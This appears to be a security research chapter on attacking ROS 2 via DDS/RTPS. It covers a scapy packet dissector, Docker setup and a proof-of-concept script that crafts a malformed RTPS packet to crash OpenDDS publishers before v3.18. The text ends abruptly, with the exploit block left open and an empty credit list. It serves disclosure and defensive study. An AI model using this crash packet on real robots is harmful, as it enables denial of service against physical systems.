\newpage

## Robot Operating System (ROS) 2

The Robot Operating System (ROS) is the de *facto* standard for robot application development [@Quigley09]. It's a framework for creating robot behaviors that comprises various stacks and capabilities for message passing, perception, navigation, manipulation or security, among others. It's [estimated](https://www.businesswire.com/news/home/20190516005135/en/Rise-ROS-55-total-commercial-robots-shipped) that by 2024, 55% of the total commercial robots will be shipping at least one ROS package. **ROS is to roboticists what Linux is to computer scientists**.

This case study will analyze the security of ROS 2[^1] and demonstrate how flaws on both ROS 2 layer or its underlayers lead to the system being compromised.

[^1]: ROS 2 is the second edition of ROS targeting commercial solutions and including additional capabilities. ROS 2 (Robot Operating System 2) is an open source software development kit for robotics  applications. The purpose of ROS 2 is to offer a standard software platform to developers across industries that will carry them from research and prototyping through to deployment and  production. ROS 2 builds on the success of ROS 1, which is used today in myriad robotics applications  around the world.

### Dissecting ROS 2 network interactions

To hack ROS 2, we'll be using a network dissector of the underlying default  communication middleware that ROS 2 uses: DDS. DDS stands for Data Distribution Service and is a middleware technology used in critical applications like autonomous driving, industrial and consumer robotics, healthcare machinery or  military tactical systems, among others.

In collaboration with other researchers, we built a DDS (more specifically, a Real-Time Publish Subscribe (RTPS) protocol) dissector to tinker with the ROS 2 communications. For a stable (known to work for the PoCs presented below) branch of the dissector, refer to [https://github.com/vmayoral/scapy/tree/rtps](https://github.com/vmayoral/scapy/tree/rtps) or alternatively, refer to the [official Pull Request we sent to scapy](https://github.com/secdev/scapy/pull/3403) for upstream integration.

The package dissector allows to both dissect and craft, which will be helpful while checking the resilience of ROS 2 communications. E.g., the following Python piece shows how to craft a simple empty RTPS package that will interoperate with ROS 2 Nodes:

![](../../images/2021/rtps_simple.png)

![A simple empty RTPS package](images/2021/rtps_simple.pdf)

```python
rtps_package = RTPS(
    protocolVersion=ProtocolVersionPacket(major=2, minor=4),
    vendorId=VendorIdPacket(vendor_id=b"\x01\x03"),
    guidPrefix=GUIDPrefixPacket(
        hostId=16974402, appId=2886795266, instanceId=1172693757
    ),
    magic=b"RTPS",
)
```



Let's get started by dockerizing an arbitrary targeted ROS 2 system.

### Dockerizing the target environment
ROS 2 is nicely integrated with Docker, which simplifies creating a hacking development environment. Let's build on top of the default ROS 2 containers and produce two targets for the latest LTS ROS 2 release: ROS 2 Foxy (latest LTS)

#### Build for Foxy from source and run

```bash
# Build may take a while depending on your machine specs
docker build -t hacking_ros2:foxy --build-arg DISTRO=foxy .
```

#### Run headless
```bash
# Launch container
docker run -it hacking_ros2:foxy /bin/bash

# Now test the dissector
cat << EOF > /tmp/rtps_test.py
from scapy.all import *
from scapy.layers.inet import UDP, IP
from scapy.contrib.rtps import *

bind_layers(UDP, RTPS)
conf.verb = 0

rtps_package = RTPS(
    protocolVersion=ProtocolVersionPacket(major=2, minor=4),
    vendorId=VendorIdPacket(vendor_id=b"\x01\x03"),
    guidPrefix=GUIDPrefixPacket(
        hostId=16974402, appId=2886795266, instanceId=1172693757
    ),
    magic=b"RTPS",
)

hexdump(rtps_package)
rtps_package.show()
EOF

python3 /tmp/rtps_test.py
0000  52 54 50 53 02 04 01 03 01 03 02 42 AC 11 00 02  RTPS.......B....
0010  45 E5 E2 FD                                      E...
###[ RTPS Header ]###
  magic     = 'RTPS'
  \protocolVersion\
   |###[ RTPS Protocol Version ]###
   |  major     = 2
   |  minor     = 4
  \vendorId  \
   |###[ RTPS Vendor ID ]###
   |  vendor_id = Object Computing Incorporated, Inc. (OCI) - OpenDDS
  \guidPrefix\
   |###[ RTPS GUID Prefix ]###
   |  hostId    = 0x1030242
   |  appId     = 0xac110002
   |  instanceId= 0x45e5e2fd
```

#### Run, using X11
```bash
xhost + # (careful with this! use your IP instead if possible)
docker run -it -v /tmp/.X11-unix:/tmp/.X11-unix -e DISPLAY=$DISPLAY -v $HOME/.Xauthority:/home/xilinx/.Xauthority hacking_ros2:foxy
```

### Crashing ROS 2 Nodes

```python
"""
A simple python script to crash ROS 2 communication on top of OpenDDS
"""

from scapy.all import *
from scapy.layers.inet import UDP, IP
from scapy.contrib.rtps import *

bind_layers(UDP, RTPS)
conf.verb = 0


dst = "172.17.0.2"
sport = 17900
dport = 7410

# # crash OpenDDS publisher prior to v3.18
opendds_crasher = (
    IP(
        version=4,
        ihl=5,
        tos=0,
        len=82,
        flags=2,
        frag=0,
        ttl=64,
        proto=17,
        dst=dst,
    )
    / UDP(sport=sport, dport=dport, len=62)
    / RTPS(
        protocolVersion=ProtocolVersionPacket(major=2, minor=4),
        vendorId=VendorIdPacket(vendor_id=b"\x01\x03"),
        guidPrefix=GUIDPrefixPacket(
            hostId=16974402, appId=2886795266, instanceId=1172693757
        ),
        magic=b"RTPS",
    )
    / RTPSMessage(
        submessages=[
            RTPSSubMessage_DATA(
                submessageId=21,
                submessageFlags=5,
                octetsToNextHeader=0,
                extraFlags=0,
                octetsToInlineQoS=16,
                readerEntityIdKey=0,
                readerEntityIdKind=0,
                writerEntityIdKey=256,
                writerEntityIdKind=194,
                writerSeqNumHi=0,
                writerSeqNumLow=2,
                data=DataPacket(
                    encapsulationKind=3,
                    encapsulationOptions=0,
                    parameterList=ParameterListPacket(
                        parameterValues=[
                            PID_BUILTIN_ENDPOINT_QOS(
                                parameterId=119, parameterLength=0, parameterData=b""
                            ),
                            PID_PAD(parameterId=b"\x00\x00"),
                        ]
                    ),
                ),
            )
        ]
    )
)

#### Run setup (inside container)
```bash
byobu -f configs/poc.conf attach
```



### Credit
This research is the result of a cooperation among various security researchers. The following individuals too part on it:
